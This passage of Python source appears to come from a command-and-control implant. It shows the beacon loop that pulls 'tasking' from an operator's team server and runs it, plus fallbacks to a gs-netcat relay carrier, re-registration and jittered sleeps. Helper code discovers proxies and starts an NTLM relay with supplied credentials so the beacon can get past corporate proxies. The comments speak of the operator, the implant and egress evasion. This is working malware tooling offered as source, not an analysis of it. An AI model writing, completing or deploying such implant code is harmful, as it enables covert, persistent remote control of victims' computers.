                # rescue runs like any other tasking: assigning it inside
                # the failure arm would collect the operator's reply and
                # then drop it, because the arm that dispatches is an elif.
                rescued = self._maybe_rescue()
                if rescued:
                    # The team server answered with something to do, so it
                    # is reachable and it is deciding. For the rest of this
                    # window and not only this cycle: the rescue is one
                    # query per window, so that answer is its instruction
                    # for all of it.
                    self._rescue_answered = True
                if rescued and not tasking:
                    tasking = rescued
                if self._egress_enabled:
                    # One attempt at most, and the latch is the fallback
                    # for a cycle on which none was made -- no rule held,
                    # the rule that held had nothing to work on, the
                    # server answered, or the budget is spent. Not on the
                    # first stuck cycle: the decider may not act on it, so
                    # the carrier it would have chosen must not arrive by
                    # the back door either, or the policy's first rule
                    # could never be the thing that brought it up.
                    acted = self._egress_act()
                    may_have_acted = (self._stuck_cycles
                                      >= self._EGRESS_FIRST_ACTING_CYCLE)
                    if self.gsocket_enabled and may_have_acted and not acted:
                        self._gsocket_start()

            if tasking is None:
                self._consecutive_failures += 1
                if self._consecutive_failures > 0 and self._consecutive_failures % 5 == 0:
                    logger.info("Re-registering after %d failures", self._consecutive_failures)
                    self._registered = False
                    # The same generalisation as the preamble, and for a
                    # sharper reason: this called `_register_https`
                    # whatever the configuration, so a beacon whose only
                    # leg is gsocket posted to an empty callback URL and
                    # filed an `https` failure into its own rescue record
                    # -- a diagnostic about a leg the operator never
                    # configured, sitting beside the real reason. The
                    # fifth leg made "no HTTPS leg at all" a shipping
                    # configuration for the first time.
                    self._register_upstream()
            else:
                self._consecutive_failures = 0
                if delivered_by in _RESCUE_UPSTREAM:
                    self._leg_recovered()
                if tasking:
                    logger.debug("Tasking: %s", tasking.get("cmd", "?"))
                    self._process_tasking_batch(tasking)

            if self._consecutive_failures > 3:
                self._backoff_sleep()
            else:
                self._jittered_sleep()

    def _init_proxy(self):
        self._proxy_session = self._bound_session()

        if self.proxy_mode == "none":
            self._proxy_session.trust_env = False
            logger.info("Proxy: disabled (direct connection)")
            return

        if self._start_ntlm_relay():
            return

        if self.proxy_mode == "manual" and self.proxy_url:
            self._proxy_session.proxies = {
                "http": self.proxy_url, "https": self.proxy_url,
            }
            logger.info("Proxy: manual — %s", self.proxy_url)
            return

        discovered = self._proxy.discover_all()
        if discovered:
            logger.info("Proxy: %s", self._proxy.summary())
            non_pac = [p for p in discovered if not p.get("is_pac")]
            if non_pac:
                working = self._proxy.select_working(
                    self.callback_url.rsplit("/", 1)[0], timeout=8)
                if working:
                    self._proxy_session.proxies = self._proxy.get_urllib_proxies()
                    return
            logger.info("Proxy: no working proxy found, trying direct")
        else:
            logger.info("Proxy: none discovered, using direct connection")
        self._proxy_session.trust_env = True

    def _start_ntlm_relay(self) -> bool:
        """Start the local NTLM relay if configured. Returns True on success."""
        cfg = self._proxy_ntlm_cfg
        if not cfg.get("enabled"):
            return False

        username = cfg.get("username", "")
        password = cfg.get("password", "")
        if not username or not password:
            logger.warning("Proxy: NTLM enabled but username/password missing — skipping relay")
            return False

        host = cfg.get("host", "")
        port = int(cfg.get("port", 8080) or 8080)
        if not host:
            # No explicit upstream: reuse whatever the discovery found.
            host, port = self._discover_ntlm_upstream(port)
            if not host:
                logger.warning("Proxy: NTLM enabled but no upstream proxy configured "
                               "or discovered — skipping relay")
                return False
            logger.info("Proxy: NTLM upstream auto-discovered as %s:%d", host, port)

        try:
            relay = _NtlmProxyRelay(
                host, port, username, password,
                domain=cfg.get("domain", ""),
                workstation=cfg.get("workstation", ""),
            )
            relay.start()
        except Exception as e:
            logger.warning("Proxy: NTLM relay failed to start (%s) — falling back", e)
            return False

        self._ntlm_relay = relay
        self._proxy_session.proxies = {"http": relay.url, "https": relay.url}
        logger.info("Proxy: NTLM relay %s -> %s (identity: %s)",
                    relay.url, relay.upstream_url, relay.identity)
        return True

    def _discover_ntlm_upstream(self, default_port: int) -> tuple:
        """Find an upstream proxy host/port for the NTLM relay."""
        candidates = []
        if self.proxy_url:
            candidates.append(self.proxy_url)
        try:
            for proxy in self._proxy.discover_all():
                if not proxy.get("is_pac") and proxy.get("url"):
                    candidates.append(proxy["url"])
        except Exception as e:
            logger.debug("NTLM upstream discovery failed: %s", e)

        for url in candidates:
            netloc = url.split("://", 1)[-1].rstrip("/")
            if "@" in netloc:
                netloc = netloc.rsplit("@", 1)[1]
            host, _, port_str = netloc.partition(":")
            if not host or host.startswith("127."):
                continue
            try:
                return host, int(port_str) if port_str else default_port
            except ValueError:
                return host, default_port
        return "", default_port

    def start(self):
        self._running = True
        self._init_proxy()
        self._thread = threading.Thread(
            target=self._beacon_loop, daemon=True, name="c2-beacon",
        )
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        if self._ntlm_relay:
            self._ntlm_relay.stop()
            self._ntlm_relay = None
        # The beacon is the only way to task the tunnel, so a tunnel that
        # outlived it would be a process nothing could reach and nothing
        # could stop. The record is left in place: see `_tunnel_stop`.
        if self._tunnel_proc is not None and self._tunnel_proc.poll() is None:
            logger.info("Beacon stopping: taking tunnel child pid %d with it",
                        self._tunnel_proc.pid)
            self._tunnel_stop()
        # And the carrier, for a sharper reason: a `gs-netcat` left behind
        # keeps this implant's address on the relay network occupied with
        # nothing behind it, so the team server's carrier would pair with
        # it on every check-in and the implant would look reachable while
        # being gone.
        self._gsocket_stop()
        logger.info("Beacon stopped")
